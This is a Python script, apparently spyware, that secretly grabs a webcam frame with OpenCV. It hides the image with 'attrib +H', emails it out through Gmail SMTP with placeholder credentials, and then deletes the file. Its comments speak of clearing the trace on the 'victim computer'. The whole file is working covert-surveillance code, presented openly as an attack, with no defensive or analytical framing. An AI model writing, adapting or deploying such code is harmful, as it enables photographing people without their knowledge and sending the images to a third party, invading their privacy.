from cv2 import destroyAllWindows
from cv2 import imwrite
from cv2 import VideoCapture
import subprocess
from os import remove
from os import path
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
#define a mail sender function
def SendMail(ImgFileName):
    #the image is opened in binary reading mode
    img_data = open(ImgFileName, 'rb').read()
    #msg variable is used to collect the header information of the mail
    msg = MIMEMultipart()
    msg['Subject'] = 'subject'
    msg['From'] = 'sender_mail'
    msg['To'] = 'receiver_mail'
    #we attach the required information to the mail message in order to be sended
    text = MIMEText("test")
    msg.attach(text)
    image = MIMEImage(img_data, name=path.basename(ImgFileName))
    msg.attach(image)

    server=smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.login("sender_mail", "sender_pass")
    server.sendmail("sender_mail", "receiver_mail", msg.as_string())
    server.quit()



videoCaptureObject = VideoCapture(0)
result = True
while(result):#we communicate with the webcam using the openCV module and the video capture object isn't release until the image is taken then we destroy the window to clear the trace

    ret,frame = videoCaptureObject.read()
    imwrite("image.jpg",frame)
    result = False
videoCaptureObject.release()
destroyAllWindows()
#the image is switched into hidden mode until it's sent by mail
subprocess.check_call(["attrib","+H",'image.jpg'])


SendMail('image.jpg')
#after the image is sent we remove it from the victim computer using the os module
remove('image.jpg')